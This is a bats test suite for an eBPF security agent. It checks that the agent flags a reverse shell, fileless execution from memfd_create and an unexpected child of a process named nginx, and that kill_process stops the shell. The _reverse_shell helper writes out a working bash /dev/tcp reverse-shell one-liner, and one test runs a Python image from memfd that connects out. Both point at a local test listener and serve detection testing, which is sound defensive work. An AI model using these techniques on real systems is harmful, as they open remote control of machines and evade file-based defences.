#!/usr/bin/env bats
# 93-process-detections.bats - a reverse shell, a binary with no file and an
# unexpected descendant of a server, each found on a process holding a
# connection this node opened.
#
# The suite asserts:
#
#   * A shell whose standard streams are an internet socket raises
#     process-reverse-shell naming its pid.
#   * A process running an image from memfd_create and holding a connection
#     raises process-fileless naming its pid.
#   * A program started under a process named nginx that connects out
#     raises process-server-descendant naming its pid, and the same program
#     started from a shell raises nothing.
#   * The processes command shows the shell the detection named.
#   * With kill_process on, the reverse shell is stopped once named.
#
# Requires: root, kernel >= 6.12, jq, python3, ncat, nft.

load '../lib/helpers'
load '../lib/ebpf_helpers'

setup_file() {
    require_root
    require_kernel 6 12
    require_tool jq
    require_tool python3
    require_tool ncat
    require_tool nft

    export PROJECT_ROOT
    PROJECT_ROOT="$(find_project_root)"
    require_ebpf_env

    if [ "${EBPF_2VM_MODE:-false}" = "true" ]; then
        env_skip "suite 93 starts its processes on the agent's host (local lane only)"
    fi

    export DATA_DIR="/tmp/ebpfsentinel-test-data-procdet-$$"
    mkdir -p "$DATA_DIR"

    stop_ebpf_agent 2>/dev/null || true
    destroy_test_netns 2>/dev/null || true
    create_test_netns

    # The host tracks its own outgoing flows, which is what the connection
    # table the detections read is fed from.
    nft delete table inet ebpfsentinel_procdet 2>/dev/null || true
    nft add table inet ebpfsentinel_procdet
    nft add chain inet ebpfsentinel_procdet out '{ type filter hook output priority 0; policy accept; }'
    nft add rule inet ebpfsentinel_procdet out ct state new counter accept

    export SYS_PYTHON PYTHONHOME_DIR NGINX
    SYS_PYTHON="$(readlink -f "$(command -v python3)")"
    PYTHONHOME_DIR="$("$SYS_PYTHON" -c 'import sys; print(sys.base_prefix)')"
    NGINX="${DATA_DIR}/nginx"
    cp "$SYS_PYTHON" "$NGINX"
    chmod 0755 "$NGINX"

    export LISTENER_PIDS=""
    local port
    for port in 7301 7302 7303 7304 7305; do
        LISTENER_PIDS="${LISTENER_PIDS} $(_listen "$port")"
    done
    export CHILD_PIDS=""
}

teardown_file() {
    # shellcheck disable=SC2086
    kill ${LISTENER_PIDS:-} 2>/dev/null || true
    stop_ebpf_agent 2>/dev/null || true
    destroy_test_netns 2>/dev/null || true
    nft delete table inet ebpfsentinel_procdet 2>/dev/null || true
    rm -rf "${DATA_DIR:-/tmp/ebpfsentinel-test-data-procdet-$$}"
    rm -f "${PREPARED_CONFIG:-}"
}

teardown() {
    local pid
    for pid in $(cat "${DATA_DIR}/children" 2>/dev/null); do
        kill -9 "$pid" 2>/dev/null || true
    done
    rm -f "${DATA_DIR}/children"
}

# ── Helpers (suite-local) ───────────────────────────────────────────

_listen() {
    local port="${1:?usage: _listen <port>}"
    # The far end keeps every connection open and sends nothing, so the
    # shell on the near end waits on its socket. Not `ncat --recv-only`:
    # it half-closes its side, the shell reads end of file on its stdin and
    # exits before a sample can see it.
    ip netns exec "$EBPF_TEST_NS" python3 -c '
import socket, sys
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((sys.argv[1], int(sys.argv[2])))
server.listen(64)
held = []
while True:
    held.append(server.accept()[0])
' "$EBPF_NS_IP" "$port" >/dev/null 2>&1 &
    local pid=$!
    local attempt=0
    while [ "$attempt" -lt 25 ]; do
        ip netns exec "$EBPF_TEST_NS" ss -tlnH "sport = :${port}" 2>/dev/null | grep -q . && break
        sleep 0.1
        attempt=$((attempt + 1))
    done
    echo "$pid"
}

# _start_agent <false|true> - kill_process off or on.
_start_agent() {
    stop_ebpf_agent 2>/dev/null || true
    local fixture="${DATA_DIR}/config-kill-${1}.yaml"
    sed -e "s|__KILL__|${1}|" "${FIXTURE_DIR}/config-ebpf-process-detections.yaml" > "$fixture"
    PREPARED_CONFIG="$(prepare_ebpf_config "$fixture")"
    export PREPARED_CONFIG
    start_ebpf_agent "$PREPARED_CONFIG"
    wait_for_ebpf_loaded 30 || {
        tail -20 "$AGENT_LOG_FILE" >&2
        return 1
    }
    local attempt=0
    while ! grep -q "process detections running" "$AGENT_LOG_FILE" && [ "$attempt" -lt 30 ]; do
        sleep 0.5
        attempt=$((attempt + 1))
    done
    grep -q "process detections running" "$AGENT_LOG_FILE" || {
        echo "# the detections did not start" >&3
        tail -30 "$AGENT_LOG_FILE" >&3
        return 1
    }
}

# _background <command...> - start a command detached, record its pid.
_background() {
    "$@" >/dev/null 2>&1 &
    local pid=$!
    echo "$pid" >> "${DATA_DIR}/children"
    echo "$pid"
}

# _reverse_shell <port> - an interactive shell whose three streams are a
# connection to the namespace.
_reverse_shell() {
    _background bash -c "exec bash -i <>/dev/tcp/${EBPF_NS_IP}/${1} >&0 2>&0"
}

# _rule_for <rule> <pid> [tries] - the alert of that rule naming that pid.
_rule_for() {
    wait_for_alert ".[] | select(.rule_id == \"$1\" and (.tgid == $2 or .workload.pid == $2))" "${3:-20}" 1
}

_no_rule_for() {
    local body
    body="$(api_get /api/v1/alerts)"
    [ "$(echo "$body" | jq --arg r "$1" --argjson p "$2" \
        '[.alerts // . | .[] | select(.rule_id == $r and (.tgid == $p or .workload.pid == $p))] | length')" = "0" ]
}

# ── Tests ───────────────────────────────────────────────────────────

@test "a shell whose streams are an internet socket is a reverse shell" {
    _start_agent false
    local pid
    pid="$(_reverse_shell 7301)"
    run _rule_for process-reverse-shell "$pid"
    [ "$status" -eq 0 ] || {
        api_get /api/v1/alerts | jq -c '[.alerts // . | .[] | select(.component == "process")]' >&3
        false
    }
    # Detections raise and stop nothing by default.
    kill -0 "$pid"

    # The processes command reads the same table the detection did.
    local out
    out="$("$AGENT_BIN" --output json processes --port "$AGENT_HTTP_PORT" show "$pid" 2>&1)" || {
        echo "# processes show: ${out}" >&3
        false
    }
    assert_contains "$out" "bash"
    out="$("$AGENT_BIN" --output json processes --port "$AGENT_HTTP_PORT" list --limit 0 2>&1)"
    assert_contains "$out" "$pid"
}

@test "a process running an image from memfd and holding a connection is fileless" {
    local pid
    pid="$(_background env PYTHONHOME="$PYTHONHOME_DIR" "$SYS_PYTHON" -c '
import os, sys
fd = os.memfd_create("ebpf-test-image")
with open(sys.executable, "rb") as f:
    os.write(fd, f.read())
script = "import socket, time\ns = socket.create_connection((%r, 7302))\ntime.sleep(60)\n" % sys.argv[1]
os.execve("/proc/self/fd/%d" % fd, ["memfd-python", "-c", script], dict(os.environ))
' "$EBPF_NS_IP")"
    run _rule_for process-fileless "$pid"
    [ "$status" -eq 0 ] || {
        api_get /api/v1/alerts | jq -c '[.alerts // . | .[] | select(.component == "process")]' >&3
        readlink "/proc/${pid}/exe" >&3 || true
        false
    }
}

@test "a program a server started that connects out is an unexpected descendant, and the same program from a shell is not" {
    local server child
    server="$(_background env PYTHONHOME="$PYTHONHOME_DIR" "$NGINX" -c '
import subprocess, sys, time
subprocess.Popen(["ncat", "--recv-only", sys.argv[1], "7303"])
time.sleep(60)
' "$EBPF_NS_IP")"
    local attempt=0
    while [ -z "${child:-}" ] && [ "$attempt" -lt 50 ]; do
        child="$(pgrep -P "$server" -x ncat || true)"
        sleep 0.1
        attempt=$((attempt + 1))
    done
    [ -n "$child" ]
    echo "$child" >> "${DATA_DIR}/children"

    run _rule_for process-server-descendant "$child"
    [ "$status" -eq 0 ] || {
        api_get /api/v1/alerts | jq -c '[.alerts // . | .[] | select(.component == "process")]' >&3
        false
    }

    local plain
    plain="$(_background ncat --recv-only "$EBPF_NS_IP" 7304)"
    sleep 4
    _no_rule_for process-server-descendant "$plain"
}

@test "with kill_process on the reverse shell is stopped once named" {
    _start_agent true
    local pid
    pid="$(_reverse_shell 7305)"
    run _rule_for process-reverse-shell "$pid"
    [ "$status" -eq 0 ]
    local attempt=0
    while kill -0 "$pid" 2>/dev/null && [ "$attempt" -lt 50 ]; do
        sleep 0.1
        attempt=$((attempt + 1))
    done
    ! kill -0 "$pid" 2>/dev/null || {
        echo "# pid ${pid} still runs after its alert" >&3
        false
    }
}
